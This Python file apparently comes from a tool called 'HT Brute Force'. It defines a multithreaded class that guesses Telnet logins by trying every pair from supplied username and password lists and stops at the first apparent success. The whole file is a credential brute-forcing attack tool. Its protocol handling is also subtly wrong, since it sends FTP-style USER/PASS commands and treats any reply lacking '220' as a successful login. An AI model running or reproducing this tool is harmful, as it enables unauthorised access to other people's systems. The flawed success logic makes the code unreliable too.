"""HT Brute Force — Telnet brute force.
"""
import socket, time, threading, queue

class TelnetBruter:
    def __init__(self, timeout=10, max_threads=5, stop_event=None):
        self.timeout = timeout
        self.max_threads = max_threads
        self.stop_event = stop_event or threading.Event()
        self.results = []

    def _try_login(self, host, port, user, passwd):
        if self.stop_event.is_set():
            return None
        t0 = time.time()
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(self.timeout)
            s.connect((host, port))
            s.recv(1024)  # banner
            s.send(b"USER " + user.encode() + b"\r\n")
            resp = s.recv(1024)
            s.send(b"PASS " + passwd.encode() + b"\r\n")
            resp = s.recv(1024)
            elapsed = time.time() - t0
            s.close()
            if b"success" in resp.lower() or b"welcome" in resp.lower() or b"220" not in resp:
                if b"fail" not in resp.lower() and b"incorrect" not in resp.lower():
                    return {"user": user, "password": passwd, "time_s": round(elapsed, 2)}
            return None
        except (socket.timeout, ConnectionRefusedError, OSError):
            return {"error": "connect"}

    def run(self, host, port, users, passwords):
        q = queue.Queue()
        for u in users:
            for p in passwords:
                q.put((u, p))
        def worker():
            while not q.empty() and not self.stop_event.is_set():
                try:
                    u, p = q.get_nowait()
                except Exception:
                    break
                r = self._try_login(host, port, u, p)
                if r:
                    self.results.append(r)
                    if r.get("password"):
                        self.stop_event.set()
        threads = [threading.Thread(target=worker, daemon=True) for _ in range(self.max_threads)]
        for t in threads: t.start()
        for t in threads: t.join(timeout=self.timeout + 5)
        return self.results